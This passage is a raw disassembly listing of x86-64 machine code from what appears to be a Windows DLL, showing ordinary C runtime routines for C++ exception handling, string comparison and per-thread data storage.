   180003e53:	44 88 74 24 20       	mov    %r14b,0x20(%rsp)
   180003e58:	8b 09                	mov    (%rcx),%ecx
   180003e5a:	48 03 48 60          	add    0x60(%rax),%rcx
   180003e5e:	45 8b 09             	mov    (%r9),%r9d
   180003e61:	e8 6a f2 ff ff       	call   0x1800030d0
   180003e66:	44 88 74 24 38       	mov    %r14b,0x38(%rsp)
   180003e6b:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   180003e70:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   180003e75:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   180003e7c:	00 
   180003e7d:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   180003e82:	4c 8b cf             	mov    %rdi,%r9
   180003e85:	4c 8b c6             	mov    %rsi,%r8
   180003e88:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003e8d:	48 8b cd             	mov    %rbp,%rcx
   180003e90:	e8 eb 28 00 00       	call   0x180006780
   180003e95:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   180003e9a:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180003e9e:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   180003ea2:	49 8b e3             	mov    %r11,%rsp
   180003ea5:	41 5e                	pop    %r14
   180003ea7:	5f                   	pop    %rdi
   180003ea8:	5e                   	pop    %rsi
   180003ea9:	c3                   	ret
   180003eaa:	cc                   	int3
   180003eab:	cc                   	int3
   180003eac:	cc                   	int3
   180003ead:	cc                   	int3
   180003eae:	cc                   	int3
   180003eaf:	cc                   	int3
   180003eb0:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180003eb5:	53                   	push   %rbx
   180003eb6:	55                   	push   %rbp
   180003eb7:	56                   	push   %rsi
   180003eb8:	57                   	push   %rdi
   180003eb9:	41 54                	push   %r12
   180003ebb:	41 55                	push   %r13
   180003ebd:	41 56                	push   %r14
   180003ebf:	41 57                	push   %r15
   180003ec1:	48 83 ec 48          	sub    $0x48,%rsp
   180003ec5:	4c 8b f1             	mov    %rcx,%r14
   180003ec8:	49 8b e9             	mov    %r9,%rbp
   180003ecb:	49 8b c8             	mov    %r8,%rcx
   180003ece:	49 8b d8             	mov    %r8,%rbx
   180003ed1:	4c 8b ea             	mov    %rdx,%r13
   180003ed4:	e8 07 3d 00 00       	call   0x180007be0
   180003ed9:	4c 8b 65 08          	mov    0x8(%rbp),%r12
   180003edd:	4c 8b 7d 00          	mov    0x0(%rbp),%r15
   180003ee1:	48 8b 7d 38          	mov    0x38(%rbp),%rdi
   180003ee5:	4d 2b fc             	sub    %r12,%r15
   180003ee8:	41 f6 46 04 66       	testb  $0x66,0x4(%r14)
   180003eed:	8b 75 48             	mov    0x48(%rbp),%esi
   180003ef0:	0f 85 eb 00 00 00    	jne    0x180003fe1
   180003ef6:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   180003efb:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180003f00:	3b 37                	cmp    (%rdi),%esi
   180003f02:	0f 83 ac 01 00 00    	jae    0x1800040b4
   180003f08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180003f0f:	00 
   180003f10:	8b de                	mov    %esi,%ebx
   180003f12:	48 c1 e3 04          	shl    $0x4,%rbx
   180003f16:	48 03 df             	add    %rdi,%rbx
   180003f19:	8b 43 04             	mov    0x4(%rbx),%eax
   180003f1c:	4c 3b f8             	cmp    %rax,%r15
   180003f1f:	0f 82 a6 00 00 00    	jb     0x180003fcb
   180003f25:	8b 43 08             	mov    0x8(%rbx),%eax
   180003f28:	4c 3b f8             	cmp    %rax,%r15
   180003f2b:	0f 83 9a 00 00 00    	jae    0x180003fcb
   180003f31:	83 7b 10 00          	cmpl   $0x0,0x10(%rbx)
   180003f35:	0f 84 90 00 00 00    	je     0x180003fcb
   180003f3b:	8b 43 0c             	mov    0xc(%rbx),%eax
   180003f3e:	83 f8 01             	cmp    $0x1,%eax
   180003f41:	74 17                	je     0x180003f5a
   180003f43:	49 03 c4             	add    %r12,%rax
   180003f46:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180003f4b:	49 8b d5             	mov    %r13,%rdx
   180003f4e:	ff d0                	call   *%rax
   180003f50:	85 c0                	test   %eax,%eax
   180003f52:	0f 88 82 00 00 00    	js     0x180003fda
   180003f58:	7e 71                	jle    0x180003fcb
   180003f5a:	41 81 3e 63 73 6d e0 	cmpl   $0xe06d7363,(%r14)
   180003f61:	75 28                	jne    0x180003f8b
   180003f63:	48 83 3d ad e6 00 00 	cmpq   $0x0,0xe6ad(%rip)        # 0x180012618
   180003f6a:	00 
   180003f6b:	74 1e                	je     0x180003f8b
   180003f6d:	48 8d 0d a4 e6 00 00 	lea    0xe6a4(%rip),%rcx        # 0x180012618
   180003f74:	e8 57 c5 00 00       	call   0x1800104d0
   180003f79:	85 c0                	test   %eax,%eax
   180003f7b:	74 0e                	je     0x180003f8b
   180003f7d:	ba 01 00 00 00       	mov    $0x1,%edx
   180003f82:	49 8b ce             	mov    %r14,%rcx
   180003f85:	ff 15 8d e6 00 00    	call   *0xe68d(%rip)        # 0x180012618
   180003f8b:	8b 4b 10             	mov    0x10(%rbx),%ecx
   180003f8e:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180003f94:	49 03 cc             	add    %r12,%rcx
   180003f97:	49 8b d5             	mov    %r13,%rdx
   180003f9a:	e8 01 3c 00 00       	call   0x180007ba0
   180003f9f:	48 8b 45 40          	mov    0x40(%rbp),%rax
   180003fa3:	4d 8b c6             	mov    %r14,%r8
   180003fa6:	8b 53 10             	mov    0x10(%rbx),%edx
   180003fa9:	49 8b cd             	mov    %r13,%rcx
   180003fac:	45 8b 0e             	mov    (%r14),%r9d
   180003faf:	49 03 d4             	add    %r12,%rdx
   180003fb2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180003fb7:	48 8b 45 28          	mov    0x28(%rbp),%rax
   180003fbb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003fc0:	ff 15 c2 e0 00 00    	call   *0xe0c2(%rip)        # 0x180012088
   180003fc6:	e8 05 3c 00 00       	call   0x180007bd0
   180003fcb:	ff c6                	inc    %esi
   180003fcd:	3b 37                	cmp    (%rdi),%esi
   180003fcf:	0f 82 3b ff ff ff    	jb     0x180003f10
   180003fd5:	e9 da 00 00 00       	jmp    0x1800040b4
   180003fda:	33 c0                	xor    %eax,%eax
   180003fdc:	e9 d8 00 00 00       	jmp    0x1800040b9
   180003fe1:	44 8b 07             	mov    (%rdi),%r8d
   180003fe4:	41 3b f0             	cmp    %r8d,%esi
   180003fe7:	0f 83 c7 00 00 00    	jae    0x1800040b4
   180003fed:	48 8b 5d 20          	mov    0x20(%rbp),%rbx
   180003ff1:	49 2b dc             	sub    %r12,%rbx
   180003ff4:	0f 1f 40 00          	nopl   0x0(%rax)
   180003ff8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180003fff:	00 
   180004000:	8b ce                	mov    %esi,%ecx
   180004002:	48 03 c9             	add    %rcx,%rcx
   180004005:	8b 44 cf 04          	mov    0x4(%rdi,%rcx,8),%eax
   180004009:	4c 8d 1c cf          	lea    (%rdi,%rcx,8),%r11
   18000400d:	4c 3b f8             	cmp    %rax,%r15
   180004010:	0f 82 90 00 00 00    	jb     0x1800040a6
   180004016:	41 8b 43 08          	mov    0x8(%r11),%eax
   18000401a:	4c 3b f8             	cmp    %rax,%r15
   18000401d:	0f 83 83 00 00 00    	jae    0x1800040a6
   180004023:	41 8b 6e 04          	mov    0x4(%r14),%ebp
   180004027:	83 e5 20             	and    $0x20,%ebp
   18000402a:	74 4a                	je     0x180004076
   18000402c:	33 d2                	xor    %edx,%edx
   18000402e:	45 85 c0             	test   %r8d,%r8d
   180004031:	74 3f                	je     0x180004072
   180004033:	4c 8d 0c cf          	lea    (%rdi,%rcx,8),%r9
   180004037:	4c 8d 14 cf          	lea    (%rdi,%rcx,8),%r10
   18000403b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004040:	8b ca                	mov    %edx,%ecx
   180004042:	48 03 c9             	add    %rcx,%rcx
   180004045:	8b 44 cf 04          	mov    0x4(%rdi,%rcx,8),%eax
   180004049:	48 3b d8             	cmp    %rax,%rbx
   18000404c:	72 1d                	jb     0x18000406b
   18000404e:	8b 44 cf 08          	mov    0x8(%rdi,%rcx,8),%eax
   180004052:	48 3b d8             	cmp    %rax,%rbx
   180004055:	73 14                	jae    0x18000406b
   180004057:	41 8b 41 10          	mov    0x10(%r9),%eax
   18000405b:	39 44 cf 10          	cmp    %eax,0x10(%rdi,%rcx,8)
   18000405f:	75 0a                	jne    0x18000406b
   180004061:	41 8b 42 0c          	mov    0xc(%r10),%eax
   180004065:	39 44 cf 0c          	cmp    %eax,0xc(%rdi,%rcx,8)
   180004069:	74 07                	je     0x180004072
   18000406b:	ff c2                	inc    %edx
   18000406d:	41 3b d0             	cmp    %r8d,%edx
   180004070:	72 ce                	jb     0x180004040
   180004072:	3b 17                	cmp    (%rdi),%edx
   180004074:	75 3e                	jne    0x1800040b4
   180004076:	41 8b 43 10          	mov    0x10(%r11),%eax
   18000407a:	85 c0                	test   %eax,%eax
   18000407c:	74 0b                	je     0x180004089
   18000407e:	48 3b d8             	cmp    %rax,%rbx
   180004081:	75 23                	jne    0x1800040a6
   180004083:	85 ed                	test   %ebp,%ebp
   180004085:	75 2d                	jne    0x1800040b4
   180004087:	eb 1d                	jmp    0x1800040a6
   180004089:	48 8b 8c 24 a8 00 00 	mov    0xa8(%rsp),%rcx
   180004090:	00 
   180004091:	8d 46 01             	lea    0x1(%rsi),%eax
   180004094:	49 8b d5             	mov    %r13,%rdx
   180004097:	89 41 48             	mov    %eax,0x48(%rcx)
   18000409a:	b1 01                	mov    $0x1,%cl
   18000409c:	45 8b 43 0c          	mov    0xc(%r11),%r8d
   1800040a0:	4d 03 c4             	add    %r12,%r8
   1800040a3:	41 ff d0             	call   *%r8
   1800040a6:	44 8b 07             	mov    (%rdi),%r8d
   1800040a9:	ff c6                	inc    %esi
   1800040ab:	41 3b f0             	cmp    %r8d,%esi
   1800040ae:	0f 82 4c ff ff ff    	jb     0x180004000
   1800040b4:	b8 01 00 00 00       	mov    $0x1,%eax
   1800040b9:	48 83 c4 48          	add    $0x48,%rsp
   1800040bd:	41 5f                	pop    %r15
   1800040bf:	41 5e                	pop    %r14
   1800040c1:	41 5d                	pop    %r13
   1800040c3:	41 5c                	pop    %r12
   1800040c5:	5f                   	pop    %rdi
   1800040c6:	5e                   	pop    %rsi
   1800040c7:	5d                   	pop    %rbp
   1800040c8:	5b                   	pop    %rbx
   1800040c9:	c3                   	ret
   1800040ca:	cc                   	int3
   1800040cb:	cc                   	int3
   1800040cc:	cc                   	int3
   1800040cd:	cc                   	int3
   1800040ce:	cc                   	int3
   1800040cf:	cc                   	int3
   1800040d0:	48 3b ca             	cmp    %rdx,%rcx
   1800040d3:	74 1a                	je     0x1800040ef
   1800040d5:	48 83 c2 09          	add    $0x9,%rdx
   1800040d9:	48 8d 41 09          	lea    0x9(%rcx),%rax
   1800040dd:	48 2b d0             	sub    %rax,%rdx
   1800040e0:	0f b6 08             	movzbl (%rax),%ecx
   1800040e3:	3a 0c 10             	cmp    (%rax,%rdx,1),%cl
   1800040e6:	75 0a                	jne    0x1800040f2
   1800040e8:	48 ff c0             	inc    %rax
   1800040eb:	84 c9                	test   %cl,%cl
   1800040ed:	75 f1                	jne    0x1800040e0
   1800040ef:	33 c0                	xor    %eax,%eax
   1800040f1:	c3                   	ret
   1800040f2:	1b c0                	sbb    %eax,%eax
   1800040f4:	83 c8 01             	or     $0x1,%eax
   1800040f7:	c3                   	ret
   1800040f8:	cc                   	int3
   1800040f9:	cc                   	int3
   1800040fa:	cc                   	int3
   1800040fb:	cc                   	int3
   1800040fc:	cc                   	int3
   1800040fd:	cc                   	int3
   1800040fe:	cc                   	int3
   1800040ff:	cc                   	int3
   180004100:	48 83 ec 28          	sub    $0x28,%rsp
   180004104:	ff 15 86 df 00 00    	call   *0xdf86(%rip)        # 0x180012090
   18000410a:	48 85 c0             	test   %rax,%rax
   18000410d:	74 1d                	je     0x18000412c
   18000410f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180004114:	48 8b 18             	mov    (%rax),%rbx
   180004117:	48 8b c8             	mov    %rax,%rcx
   18000411a:	e8 11 41 00 00       	call   0x180008230
   18000411f:	48 8b c3             	mov    %rbx,%rax
   180004122:	48 85 db             	test   %rbx,%rbx
   180004125:	75 ed                	jne    0x180004114
   180004127:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   18000412c:	48 83 c4 28          	add    $0x28,%rsp
   180004130:	c3                   	ret
   180004131:	cc                   	int3
   180004132:	cc                   	int3
   180004133:	cc                   	int3
   180004134:	cc                   	int3
   180004135:	cc                   	int3
   180004136:	cc                   	int3
   180004137:	cc                   	int3
   180004138:	cc                   	int3
   180004139:	cc                   	int3
   18000413a:	cc                   	int3
   18000413b:	cc                   	int3
   18000413c:	cc                   	int3
   18000413d:	cc                   	int3
   18000413e:	cc                   	int3
   18000413f:	cc                   	int3
   180004140:	48 83 ec 28          	sub    $0x28,%rsp
   180004144:	e8 d7 3a 00 00       	call   0x180007c20
   180004149:	84 c0                	test   %al,%al
   18000414b:	74 0e                	je     0x18000415b
   18000414d:	e8 2e 04 00 00       	call   0x180004580
   180004152:	84 c0                	test   %al,%al
   180004154:	75 0c                	jne    0x180004162
   180004156:	e8 55 3b 00 00       	call   0x180007cb0
   18000415b:	32 c0                	xor    %al,%al
   18000415d:	48 83 c4 28          	add    $0x28,%rsp
   180004161:	c3                   	ret
   180004162:	b0 01                	mov    $0x1,%al
   180004164:	48 83 c4 28          	add    $0x28,%rsp
   180004168:	c3                   	ret
   180004169:	cc                   	int3
   18000416a:	cc                   	int3
   18000416b:	cc                   	int3
   18000416c:	cc                   	int3
   18000416d:	cc                   	int3
   18000416e:	cc                   	int3
   18000416f:	cc                   	int3
   180004170:	48 83 ec 28          	sub    $0x28,%rsp
   180004174:	e8 27 03 00 00       	call   0x1800044a0
   180004179:	48 85 c0             	test   %rax,%rax
   18000417c:	0f 95 c0             	setne  %al
   18000417f:	48 83 c4 28          	add    $0x28,%rsp
   180004183:	c3                   	ret
   180004184:	cc                   	int3
   180004185:	cc                   	int3
   180004186:	cc                   	int3
   180004187:	cc                   	int3
   180004188:	cc                   	int3
   180004189:	cc                   	int3
   18000418a:	cc                   	int3
   18000418b:	cc                   	int3
   18000418c:	cc                   	int3
   18000418d:	cc                   	int3
   18000418e:	cc                   	int3
   18000418f:	cc                   	int3
   180004190:	48 83 ec 28          	sub    $0x28,%rsp
   180004194:	e8 c7 01 00 00       	call   0x180004360
   180004199:	b0 01                	mov    $0x1,%al
   18000419b:	48 83 c4 28          	add    $0x28,%rsp
   18000419f:	c3                   	ret
   1800041a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800041a4:	84 c9                	test   %cl,%cl
   1800041a6:	75 0a                	jne    0x1800041b2
   1800041a8:	e8 43 04 00 00       	call   0x1800045f0
   1800041ad:	e8 fe 3a 00 00       	call   0x180007cb0
   1800041b2:	b0 01                	mov    $0x1,%al
   1800041b4:	48 83 c4 28          	add    $0x28,%rsp
   1800041b8:	c3                   	ret
   1800041b9:	cc                   	int3
   1800041ba:	cc                   	int3
   1800041bb:	cc                   	int3
   1800041bc:	cc                   	int3
   1800041bd:	cc                   	int3
   1800041be:	cc                   	int3
   1800041bf:	cc                   	int3
   1800041c0:	48 83 ec 28          	sub    $0x28,%rsp
   1800041c4:	e8 27 04 00 00       	call   0x1800045f0
   1800041c9:	b0 01                	mov    $0x1,%al
   1800041cb:	48 83 c4 28          	add    $0x28,%rsp
   1800041cf:	c3                   	ret
   1800041d0:	48 85 c9             	test   %rcx,%rcx
   1800041d3:	74 67                	je     0x18000423c
   1800041d5:	88 54 24 10          	mov    %dl,0x10(%rsp)
   1800041d9:	48 83 ec 48          	sub    $0x48,%rsp
   1800041dd:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   1800041e3:	75 53                	jne    0x180004238
   1800041e5:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   1800041e9:	75 4d                	jne    0x180004238
   1800041eb:	8b 41 20             	mov    0x20(%rcx),%eax
   1800041ee:	2d 20 05 93 19       	sub    $0x19930520,%eax
   1800041f3:	83 f8 02             	cmp    $0x2,%eax
   1800041f6:	77 40                	ja     0x180004238
   1800041f8:	48 8b 41 30          	mov    0x30(%rcx),%rax
   1800041fc:	48 85 c0             	test   %rax,%rax
   1800041ff:	74 37                	je     0x180004238
   180004201:	48 63 50 04          	movslq 0x4(%rax),%rdx
   180004205:	85 d2                	test   %edx,%edx
   180004207:	74 11                	je     0x18000421a
   180004209:	48 03 51 38          	add    0x38(%rcx),%rdx
   18000420d:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   180004211:	e8 2a 00 00 00       	call   0x180004240
   180004216:	eb 20                	jmp    0x180004238
   180004218:	eb 1e                	jmp    0x180004238
   18000421a:	f6 00 10             	testb  $0x10,(%rax)
   18000421d:	74 19                	je     0x180004238
   18000421f:	48 8b 41 28          	mov    0x28(%rcx),%rax
   180004223:	48 8b 08             	mov    (%rax),%rcx
   180004226:	48 85 c9             	test   %rcx,%rcx
   180004229:	74 0d                	je     0x180004238
   18000422b:	48 8b 01             	mov    (%rcx),%rax
   18000422e:	48 8b 40 10          	mov    0x10(%rax),%rax
   180004232:	ff 15 28 e0 00 00    	call   *0xe028(%rip)        # 0x180012260
   180004238:	48 83 c4 48          	add    $0x48,%rsp
   18000423c:	c3                   	ret
   18000423d:	cc                   	int3
   18000423e:	cc                   	int3
   18000423f:	cc                   	int3
   180004240:	48 ff e2             	rex.W jmp *%rdx
   180004243:	cc                   	int3
   180004244:	cc                   	int3
   180004245:	cc                   	int3
   180004246:	cc                   	int3
   180004247:	cc                   	int3
   180004248:	cc                   	int3
   180004249:	cc                   	int3
   18000424a:	cc                   	int3
   18000424b:	cc                   	int3
   18000424c:	cc                   	int3
   18000424d:	cc                   	int3
   18000424e:	cc                   	int3
   18000424f:	cc                   	int3
   180004250:	40 53                	rex push %rbx
   180004252:	48 83 ec 20          	sub    $0x20,%rsp
   180004256:	48 8b d9             	mov    %rcx,%rbx
   180004259:	e8 62 01 00 00       	call   0x1800043c0
   18000425e:	48 8b 40 58          	mov    0x58(%rax),%rax
   180004262:	48 85 c0             	test   %rax,%rax
   180004265:	74 0e                	je     0x180004275
   180004267:	48 39 18             	cmp    %rbx,(%rax)
   18000426a:	74 14                	je     0x180004280
   18000426c:	48 8b 40 08          	mov    0x8(%rax),%rax
   180004270:	48 85 c0             	test   %rax,%rax
   180004273:	75 f2                	jne    0x180004267
   180004275:	b8 01 00 00 00       	mov    $0x1,%eax
   18000427a:	48 83 c4 20          	add    $0x20,%rsp
   18000427e:	5b                   	pop    %rbx
   18000427f:	c3                   	ret
   180004280:	33 c0                	xor    %eax,%eax
   180004282:	48 83 c4 20          	add    $0x20,%rsp
   180004286:	5b                   	pop    %rbx
   180004287:	c3                   	ret
   180004288:	cc                   	int3
   180004289:	cc                   	int3
   18000428a:	cc                   	int3
   18000428b:	cc                   	int3
   18000428c:	cc                   	int3
   18000428d:	cc                   	int3
   18000428e:	cc                   	int3
   18000428f:	cc                   	int3
   180004290:	4c 63 0a             	movslq (%rdx),%r9
   180004293:	48 63 42 04          	movslq 0x4(%rdx),%rax
   180004297:	4c 03 c9             	add    %rcx,%r9
   18000429a:	85 c0                	test   %eax,%eax
   18000429c:	78 16                	js     0x1800042b4
   18000429e:	48 63 52 08          	movslq 0x8(%rdx),%rdx
   1800042a2:	4c 8b c0             	mov    %rax,%r8
   1800042a5:	48 8b 04 08          	mov    (%rax,%rcx,1),%rax
   1800042a9:	48 63 04 02          	movslq (%rdx,%rax,1),%rax
   1800042ad:	49 03 c0             	add    %r8,%rax
   1800042b0:	49 03 c1             	add    %r9,%rax
   1800042b3:	c3                   	ret
   1800042b4:	49 8b c1             	mov    %r9,%rax
   1800042b7:	c3                   	ret
   1800042b8:	cc                   	int3
   1800042b9:	cc                   	int3
   1800042ba:	cc                   	int3
   1800042bb:	cc                   	int3
   1800042bc:	cc                   	int3
   1800042bd:	cc                   	int3
   1800042be:	cc                   	int3
   1800042bf:	cc                   	int3
   1800042c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800042c5:	57                   	push   %rdi
   1800042c6:	48 83 ec 20          	sub    $0x20,%rsp
   1800042ca:	48 8b 39             	mov    (%rcx),%rdi
   1800042cd:	48 8b d9             	mov    %rcx,%rbx
   1800042d0:	8b 07                	mov    (%rdi),%eax
   1800042d2:	3d 52 43 43 e0       	cmp    $0xe0434352,%eax
   1800042d7:	74 10                	je     0x1800042e9
   1800042d9:	3d 4d 4f 43 e0       	cmp    $0xe0434f4d,%eax
   1800042de:	74 09                	je     0x1800042e9
   1800042e0:	3d 63 73 6d e0       	cmp    $0xe06d7363,%eax
   1800042e5:	74 22                	je     0x180004309
   1800042e7:	eb 13                	jmp    0x1800042fc
   1800042e9:	e8 d2 00 00 00       	call   0x1800043c0
   1800042ee:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   1800042f2:	7e 08                	jle    0x1800042fc
   1800042f4:	e8 c7 00 00 00       	call   0x1800043c0
   1800042f9:	ff 48 30             	decl   0x30(%rax)
   1800042fc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004301:	33 c0                	xor    %eax,%eax
   180004303:	48 83 c4 20          	add    $0x20,%rsp
   180004307:	5f                   	pop    %rdi
   180004308:	c3                   	ret
   180004309:	e8 b2 00 00 00       	call   0x1800043c0
   18000430e:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180004312:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   180004316:	e8 a5 00 00 00       	call   0x1800043c0
   18000431b:	48 89 58 28          	mov    %rbx,0x28(%rax)
   18000431f:	e8 90 4c 00 00       	call   0x180008fb4
   180004324:	cc                   	int3
   180004325:	cc                   	int3
   180004326:	cc                   	int3
   180004327:	cc                   	int3
   180004328:	cc                   	int3
   180004329:	cc                   	int3
   18000432a:	cc                   	int3
   18000432b:	cc                   	int3
   18000432c:	cc                   	int3
   18000432d:	cc                   	int3
   18000432e:	cc                   	int3
   18000432f:	cc                   	int3
   180004330:	48 83 ec 28          	sub    $0x28,%rsp
   180004334:	e8 7b 4c 00 00       	call   0x180008fb4
   180004339:	cc                   	int3
   18000433a:	cc                   	int3
   18000433b:	cc                   	int3
   18000433c:	cc                   	int3
   18000433d:	cc                   	int3
   18000433e:	cc                   	int3
   18000433f:	cc                   	int3
   180004340:	48 85 c9             	test   %rcx,%rcx
   180004343:	74 10                	je     0x180004355
   180004345:	48 8d 05 f4 98 01 00 	lea    0x198f4(%rip),%rax        # 0x18001dc40
   18000434c:	48 3b c8             	cmp    %rax,%rcx
   18000434f:	0f 85 db 3e 00 00    	jne    0x180008230
   180004355:	c3                   	ret
   180004356:	cc                   	int3
   180004357:	cc                   	int3
   180004358:	cc                   	int3
   180004359:	cc                   	int3
   18000435a:	cc                   	int3
   18000435b:	cc                   	int3
   18000435c:	cc                   	int3
   18000435d:	cc                   	int3
   18000435e:	cc                   	int3
   18000435f:	cc                   	int3
   180004360:	48 83 ec 28          	sub    $0x28,%rsp
   180004364:	8b 0d 06 8d 01 00    	mov    0x18d06(%rip),%ecx        # 0x18001d070
   18000436a:	83 f9 ff             	cmp    $0xffffffff,%ecx
   18000436d:	74 43                	je     0x1800043b2
   18000436f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180004374:	ff 15 36 dd 00 00    	call   *0xdd36(%rip)        # 0x1800120b0
   18000437a:	8b 0d f0 8c 01 00    	mov    0x18cf0(%rip),%ecx        # 0x18001d070
   180004380:	33 d2                	xor    %edx,%edx
   180004382:	48 8b d8             	mov    %rax,%rbx
   180004385:	ff 15 2d dd 00 00    	call   *0xdd2d(%rip)        # 0x1800120b8
   18000438b:	48 85 db             	test   %rbx,%rbx
   18000438e:	74 1d                	je     0x1800043ad
   180004390:	48 8d 05 a9 98 01 00 	lea    0x198a9(%rip),%rax        # 0x18001dc40
   180004397:	48 3b d8             	cmp    %rax,%rbx
   18000439a:	74 11                	je     0x1800043ad
   18000439c:	48 8b cb             	mov    %rbx,%rcx
   18000439f:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   1800043a4:	48 83 c4 28          	add    $0x28,%rsp
   1800043a8:	e9 83 3e 00 00       	jmp    0x180008230
   1800043ad:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   1800043b2:	48 83 c4 28          	add    $0x28,%rsp
   1800043b6:	c3                   	ret
   1800043b7:	cc                   	int3
   1800043b8:	cc                   	int3
   1800043b9:	cc                   	int3
   1800043ba:	cc                   	int3
   1800043bb:	cc                   	int3
   1800043bc:	cc                   	int3
   1800043bd:	cc                   	int3
   1800043be:	cc                   	int3
   1800043bf:	cc                   	int3
   1800043c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800043c5:	57                   	push   %rdi
   1800043c6:	48 83 ec 20          	sub    $0x20,%rsp
   1800043ca:	83 3d 9f 8c 01 00 ff 	cmpl   $0xffffffff,0x18c9f(%rip)        # 0x18001d070
   1800043d1:	0f 84 b5 00 00 00    	je     0x18000448c
   1800043d7:	ff 15 bb dc 00 00    	call   *0xdcbb(%rip)        # 0x180012098
   1800043dd:	8b 0d 8d 8c 01 00    	mov    0x18c8d(%rip),%ecx        # 0x18001d070
   1800043e3:	8b d8                	mov    %eax,%ebx
   1800043e5:	ff 15 c5 dc 00 00    	call   *0xdcc5(%rip)        # 0x1800120b0
   1800043eb:	48 8b f8             	mov    %rax,%rdi
   1800043ee:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1800043f2:	0f 84 8c 00 00 00    	je     0x180004484
   1800043f8:	48 85 c0             	test   %rax,%rax
   1800043fb:	75 5b                	jne    0x180004458
   1800043fd:	8b 0d 6d 8c 01 00    	mov    0x18c6d(%rip),%ecx        # 0x18001d070
   180004403:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   18000440a:	ff 15 a8 dc 00 00    	call   *0xdca8(%rip)        # 0x1800120b8
   180004410:	85 c0                	test   %eax,%eax
   180004412:	74 70                	je     0x180004484
   180004414:	ba 80 00 00 00       	mov    $0x80,%edx
   180004419:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000441e:	e8 9d 4c 00 00       	call   0x1800090c0
   180004423:	8b 0d 47 8c 01 00    	mov    0x18c47(%rip),%ecx        # 0x18001d070
   180004429:	48 8b f8             	mov    %rax,%rdi
   18000442c:	48 85 c0             	test   %rax,%rax
   18000442f:	75 0c                	jne    0x18000443d
   180004431:	33 d2                	xor    %edx,%edx
   180004433:	ff 15 7f dc 00 00    	call   *0xdc7f(%rip)        # 0x1800120b8
   180004439:	33 c9                	xor    %ecx,%ecx
   18000443b:	eb 42                	jmp    0x18000447f
   18000443d:	48 8b d7             	mov    %rdi,%rdx
   180004440:	ff 15 72 dc 00 00    	call   *0xdc72(%rip)        # 0x1800120b8
   180004446:	85 c0                	test   %eax,%eax
   180004448:	74 24                	je     0x18000446e
   18000444a:	33 c9                	xor    %ecx,%ecx
   18000444c:	c7 47 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rdi)
   180004453:	e8 d8 3d 00 00       	call   0x180008230
   180004458:	8b cb                	mov    %ebx,%ecx
   18000445a:	ff 15 40 dc 00 00    	call   *0xdc40(%rip)        # 0x1800120a0
   180004460:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004465:	48 8b c7             	mov    %rdi,%rax
   180004468:	48 83 c4 20          	add    $0x20,%rsp
   18000446c:	5f                   	pop    %rdi
   18000446d:	c3                   	ret
   18000446e:	8b 0d fc 8b 01 00    	mov    0x18bfc(%rip),%ecx        # 0x18001d070
   180004474:	33 d2                	xor    %edx,%edx
   180004476:	ff 15 3c dc 00 00    	call   *0xdc3c(%rip)        # 0x1800120b8
   18000447c:	48 8b cf             	mov    %rdi,%rcx
   18000447f:	e8 ac 3d 00 00       	call   0x180008230
   180004484:	8b cb                	mov    %ebx,%ecx
   180004486:	ff 15 14 dc 00 00    	call   *0xdc14(%rip)        # 0x1800120a0
   18000448c:	e8 cf 4b 00 00       	call   0x180009060
   180004491:	cc                   	int3
   180004492:	cc                   	int3
   180004493:	cc                   	int3
   180004494:	cc                   	int3
   180004495:	cc                   	int3
   180004496:	cc                   	int3
   180004497:	cc                   	int3
   180004498:	cc                   	int3
   180004499:	cc                   	int3
   18000449a:	cc                   	int3
   18000449b:	cc                   	int3
   18000449c:	cc                   	int3
   18000449d:	cc                   	int3
   18000449e:	cc                   	int3
   18000449f:	cc                   	int3
   1800044a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800044a4:	83 3d c5 8b 01 00 ff 	cmpl   $0xffffffff,0x18bc5(%rip)        # 0x18001d070
   1800044ab:	75 07                	jne    0x1800044b4
   1800044ad:	33 c0                	xor    %eax,%eax
   1800044af:	48 83 c4 28          	add    $0x28,%rsp
   1800044b3:	c3                   	ret
   1800044b4:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1800044b9:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800044be:	ff 15 d4 db 00 00    	call   *0xdbd4(%rip)        # 0x180012098
   1800044c4:	8b 0d a6 8b 01 00    	mov    0x18ba6(%rip),%ecx        # 0x18001d070
   1800044ca:	8b d8                	mov    %eax,%ebx
